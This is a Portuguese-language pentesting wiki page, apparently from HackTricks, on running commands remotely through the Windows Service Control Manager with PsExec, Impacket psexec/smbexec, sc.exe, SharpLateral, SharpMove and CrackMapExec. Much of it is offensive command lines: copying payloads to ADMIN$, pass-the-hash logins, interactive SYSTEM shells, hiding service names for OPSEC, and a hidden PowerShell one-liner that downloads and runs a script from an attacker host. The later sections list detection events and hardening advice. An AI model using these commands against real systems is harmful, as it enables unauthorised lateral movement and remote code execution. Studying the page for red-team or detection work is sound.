# Execução Remota de Serviços (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## Como funcionam

Estas técnicas abusam remotamente do Windows Service Control Manager (SCM) por SMB/RPC para executar comandos em um host de destino. O Service Control Manager Remote Protocol (SCMR) é a interface baseada em RPC para configurar e controlar serviços do Windows em um computador remoto. Com permissões suficientes, um operador pode criar ou reconfigurar um serviço cujo caminho do binário contenha um comando e, em seguida, iniciar esse serviço para executá-lo remotamente.<sup>[[5]](#references)</sup> O fluxo comum é:

1. Autenticar no destino por SMB/RPC (TCP/445); acessar o compartilhamento ADMIN$ quando a variante escolhida precisar armazenar um arquivo temporário ou recuperar a saída.
2. Copiar um executável ou especificar uma linha de comando LOLBAS que o serviço executará.
3. Criar um serviço remotamente via SCM (MS-SCMR sobre \PIPE\svcctl) apontando para esse comando ou binário.
4. Iniciar o serviço para executar o payload e, opcionalmente, capturar stdin/stdout por meio de um pipe nomeado.
5. Parar o serviço e fazer a limpeza (excluir o serviço e quaisquer binários gravados no destino).

Requisitos/pré-requisitos:
- Administrador Local no destino (SeCreateServicePrivilege) ou permissões explícitas para criar serviços no destino.
- SMB (445) acessível e Remote Service Management permitido pelo firewall do host; ADMIN$ deve estar disponível para variantes que o utilizam para armazenar um arquivo temporário ou recuperar a saída.
- Restrições Remotas do UAC: com contas locais, a filtragem de tokens pode bloquear o acesso de administrador pela rede, a menos que seja usada a conta interna de Administrador ou que LocalAccountTokenFilterPolicy=1.
- Kerberos vs. NTLM: usar um hostname/FQDN habilita Kerberos; conectar-se por IP geralmente recorre ao NTLM (e pode ser bloqueado em ambientes reforçados).

Se nenhuma conta de serviço for especificada, `CreateService` usa `LocalSystem`, que tem amplos privilégios locais. Isso explica o alto impacto de uma execução SCM bem-sucedida. Ela não desabilita inerentemente o UAC nem o Microsoft Defender: o usuário ainda precisa de permissões remotas no SCM, e os controles de endpoint podem inspecionar ou bloquear o serviço ou o payload.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### ScExec/WinExec manual via sc.exe

A seguir, é mostrada uma abordagem mínima para criar um serviço. A imagem do serviço pode ser um EXE gravado no destino ou um LOLBAS como cmd.exe ou powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notas:
- Espere um erro de timeout ao iniciar um EXE que não seja um serviço; a execução ainda ocorre.
- Para ser mais favorável à OPSEC, prefira comandos fileless (`cmd /c`, `powershell -enc`) ou exclua os artefatos gravados no disco.

Encontre etapas mais detalhadas em: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Ferramentas e exemplos

### Sysinternals PsExec.exe

- Ferramenta clássica de administração que usa SMB para gravar o PSEXESVC.exe em ADMIN$, instalar um serviço temporário (nome padrão: PSEXESVC) e encaminhar a I/O por meio de named pipes.
- Exemplos de uso:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Você pode iniciar diretamente do Sysinternals Live via WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Deixa eventos de instalação/desinstalação de serviço (o nome do serviço costuma ser PSEXESVC, a menos que -r seja usado) e cria C:\Windows\PSEXESVC.exe durante a execução.

### Impacket psexec.py (semelhante ao PsExec)

- Usa um serviço semelhante ao RemCom incorporado. Solta um binário de serviço temporário (geralmente com nome aleatório) via ADMIN$, cria um serviço (o padrão costuma ser RemComSvc) e encaminha a I/O por um named pipe.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

No Kali, os exemplos do Impacket podem estar em `/usr/share/doc/python3-impacket/examples/`. Se nenhuma senha for fornecida, a ferramenta solicitará uma. A opção `-k` do Impacket solicita autenticação Kerberos em vez de NTLM, geralmente usando o cache de credenciais atual ou as credenciais fornecidas.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Artefatos
- EXE temporário em C:\Windows\ (8 caracteres aleatórios). O nome do serviço é RemComSvc por padrão, a menos que seja substituído.

### Impacket smbexec.py (SMBExec)

- Cria um serviço temporário que inicia cmd.exe e usa um pipe nomeado para I/O. Em geral, evita gravar um payload EXE completo; a execução de comandos é seminterativa.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral and SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementa vários métodos de movimentação lateral, incluindo exec baseado em serviço.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) oferece suporte à execução remota autenticada por meio do SCM e de vários outros mecanismos do Windows, incluindo modificação/criação de serviços.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Você também pode usar o CrackMapExec para executar por meio de diferentes backends (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec with SharpMove

A ação SCM cria um serviço chamado `WindowsDebug` e o aponta para um payload que já está presente no host remoto.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, detecção e artefatos

Artefatos típicos no host/rede ao usar técnicas semelhantes ao PsExec:
- Security 4624 (Logon Type 3) e 4672 (Special Privileges) no alvo para a conta de administrador usada.
- Security 5140/5145 File Share e File Share Detailed, indicando acesso ao ADMIN$ e criação/gravação de binários de serviço (por exemplo, PSEXESVC.exe ou um .exe aleatório de 8 caracteres).
- **System** 7045 do Service Control Manager para instalação do serviço no alvo: nomes como PSEXESVC, RemComSvc ou personalizados (`-r` / `-service-name`). Isso comprova que um serviço foi instalado, não que sua imagem foi executada. Correlacione o horário e o caminho da imagem com eventos de processo ou uma entrada prefetch correspondente à imagem do serviço, quando disponível.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) para services.exe ou a imagem do serviço, 3 (Network Connect), 11 (File Create) em C:\Windows\, 17/18 (Pipe Created/Connected) para pipes como \\.\pipe\psexesvc, \\.\pipe\remcom_* ou equivalentes aleatórios.
- Artefato no Registry da EULA do Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 no host do operador (se não for suprimido).

Ideias para hunting
- Gere alertas sobre instalações de serviço cujo ImagePath inclua cmd.exe /c, powershell.exe ou locais TEMP.
- Procure criações de processos em que ParentImage seja C:\Windows\PSEXESVC.exe ou processos filhos de services.exe executados como LOCAL SYSTEM que iniciem shells.
- Sinalize named pipes terminados em -stdin/-stdout/-stderr ou nomes de pipes conhecidos de clones do PsExec.

## Solução de problemas comuns
- Acesso negado (5) ao criar serviços: o usuário não é realmente administrador local, há restrições remotas de UAC para contas locais ou a proteção contra adulteração do EDR está bloqueando o caminho do binário do serviço.
- O caminho de rede não foi encontrado (53) ou não foi possível conectar ao ADMIN$: o firewall está bloqueando SMB/RPC ou os compartilhamentos administrativos estão desativados.
- Kerberos falha, mas NTLM está bloqueado: conecte-se usando o hostname/FQDN (não o IP), verifique os SPNs ou forneça -k/-no-pass com tickets ao usar Impacket.
- O início do serviço expira, mas o payload foi executado: isso é esperado se não for um binário de serviço real; capture a saída em um arquivo ou use smbexec para I/O em tempo real.

## Observações de hardening
- Windows 11 24H2 e Windows Server 2025 exigem assinatura SMB por padrão para conexões de saída (e conexões de entrada no Windows 11). Isso não impede o uso legítimo do PsExec com credenciais válidas, mas impede o abuso de SMB relay sem assinatura e pode afetar dispositivos que não oferecem suporte à assinatura.<sup>[[2]](#references)</sup>
- O novo bloqueio de NTLM do cliente SMB (Windows 11 24H2/Server 2025) pode impedir o fallback para NTLM ao conectar-se por IP ou a servidores sem Kerberos. Em ambientes reforçados, isso interromperá o PsExec/SMBExec baseado em NTLM; use Kerberos (hostname/FQDN) ou configure exceções se necessário para uso legítimo.<sup>[[2]](#references)</sup>
- Princípio do menor privilégio: minimize a associação ao grupo de administradores locais, prefira Just-in-Time/Just-Enough Admin, aplique LAPS e monitore/alerte sobre instalações de serviço 7045.

## Veja também

- Execução remota baseada em WMI (geralmente com menos arquivos):

{{#ref}}
./wmiexec.md
{{#endref}}

- Execução remota baseada em WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Hardening de segurança SMB no Windows Server 2025 e Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Usando credenciais para comprometer máquinas Windows - Parte 2 (PSExec e serviços)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Solucionar reinicializações inesperadas usando logs de eventos do sistema](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Especificações abertas da Microsoft - Visão geral do protocolo remoto do Service Control Manager](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - Conta LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - Função `CreateService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
